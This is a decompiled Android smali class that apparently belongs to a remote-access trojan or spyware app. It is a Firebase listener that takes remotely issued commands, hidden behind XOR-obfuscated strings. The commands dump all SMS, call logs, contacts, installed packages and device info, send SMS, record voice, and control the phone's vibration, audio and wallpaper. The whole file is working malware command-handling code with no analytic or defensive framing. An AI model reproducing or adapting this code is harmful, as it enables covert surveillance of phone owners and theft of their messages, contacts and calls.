.class Lsigma/male/servicess$20;
.super Ljava/lang/Object;
.source "servicess.java"

# interfaces
.implements Lcom/google/firebase/database/ChildEventListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/servicess;->_service()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lsigma/male/servicess;


# direct methods
.method constructor <init>(Lsigma/male/servicess;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    .line 408
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onCancelled(Lcom/google/firebase/database/DatabaseError;)V
    .locals 0

    .prologue
    .line 479
    return-void
.end method

.method public onChildAdded(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 410
    return-void
.end method

.method public onChildChanged(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 4

    .prologue
    .line 415
    invoke-virtual {p1}, Lcom/google/firebase/database/DataSnapshot;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map;

    .line 416
    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiQw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/servicess;->access$4(Lsigma/male/servicess;Ljava/lang/String;)V

    .line 417
    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiWw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/servicess;->access$5(Lsigma/male/servicess;Ljava/lang/String;)V

    .line 418
    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiW1kn"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lsigma/male/servicess;->access$6(Lsigma/male/servicess;Ljava/lang/String;)V

    .line 420
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "NjA="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 421
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v3, ""

    invoke-virtual {v0, v1, v2, v3}, Lsigma/male/servicess;->_cd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 469
    :cond_0
    :goto_0
    return-void

    .line 423
    :cond_1
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTk2XlUm"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 424
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v1}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->getAllSms(Landroid/content/Context;)V

    goto :goto_0

    .line 426
    :cond_2
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTk2Tlk5OA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 427
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_dmpcal()V

    goto :goto_0

    .line 429
    :cond_3
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTk2Tlc7IA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 430
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_dmpcon()V

    goto :goto_0

    .line 432
    :cond_4
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MjEyXVk2PydKXSY="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 433
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_getpackages()V

    goto :goto_0

    .line 435
    :cond_5
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "JjwjQVQ2OSI="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 436
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lsigma/male/servicess;->_sudoapt(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 438
    :cond_6
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTEwRFswPShLVw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 439
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_devinfo()V

    goto/16 :goto_0

    .line 441
    :cond_7
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ITsnXkwhMT5Z"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 442
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_showtoast(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 444
    :cond_8
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ISA1SV0j"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 445
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_ttsdev(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 447
    :cond_9
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "Iz0kX1khMSJITg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 448
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_vibra(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 450
    :cond_a
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "JTgnVEs4ITVEWw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 451
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_palysmudic(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 453
    :cond_b
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "JjEoSUs4Jw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 454
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v2}, Lsigma/male/servicess;->access$8(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lsigma/male/servicess;->_sendsm(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 456
    :cond_c
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "NjwnQ18wIydBVA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    .line 457
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_changewall(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 459
    :cond_d
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "IzsvTl0nMSU="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 460
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_voicere(Ljava/lang/String;)V

    goto/16 :goto_0
.end method

.method public onChildMoved(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 476
    return-void
.end method

.method public onChildRemoved(Lcom/google/firebase/database/DataSnapshot;)V
    .locals 0

    .prologue
    .line 474
    return-void
.end method
